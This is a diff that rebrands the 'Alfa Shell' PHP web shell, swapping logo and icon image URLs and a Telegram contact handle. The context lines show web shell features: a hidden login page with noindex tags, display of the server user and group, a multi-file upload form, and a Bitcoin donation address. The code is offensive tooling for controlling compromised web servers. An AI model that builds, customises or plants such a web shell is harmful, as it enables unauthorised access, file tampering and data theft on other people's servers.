@@ -535,7 +535,7 @@ body{background: black;}
 #loginbox td { border-radius:5px; font-size:11px; }
 </style>
 <title>~ Alfa Shell Haxor'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
-<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://nulz-archive.vercel.app/archive/nulz.png" /></center>
+<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel.png" /></center>
 <div id=loginbox><p><font face="verdana,arial" size=-1>
 <center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
 <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ Alfa Shell NuLz ~</b></font></th></tr>
@@ -603,8 +603,8 @@ echo '
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
-    <link href="https://nulz-archive.vercel.app/archive/nulz.ico" rel="shortcut icon" type="image/x-icon">
-    <link rel="apple-touch-icon" href="https://nulz-archive.vercel.app/archive/nulz.ico"/>
+    <link href="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel.png" rel="shortcut icon" type="image/x-icon">
+    <link rel="apple-touch-icon" href="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel.png"/>
     <script src="https://unpkg.com/typewriter-effect@2.18.2/dist/core.js"></script>
     <style>
     @import url("https://fonts.googleapis.com/css2?family=Noto+Sans+Mono&display=swap");
@@ -1471,7 +1471,7 @@ echo '<input type="hidden" name="charset">
 <tr>
 <td><span class="header_vars">User:</span></td>
 <td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
-<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://nulz-archive.vercel.app/archive/nulz.png" /></td>
+<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/ciel.png" /></td>
 </tr>
 <tr>
 <td><span class="header_vars">PHP:</span></td>
@@ -2665,7 +2665,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Alfa Shell NuLz &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>sysadmin.mikrotik@proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://haxorstars.t.me'>@haxorstars</a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Alfa Shell NuLz &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: bc1q9pq38fg09kenj0fqmamhl6fxeemw60j7uh5jax\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>sysadmin.mikrotik@proton.me</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/zaynphantomhive'>@zaynphantomhive</a></span></div></td>
 </tr>
 </table>
 </div>
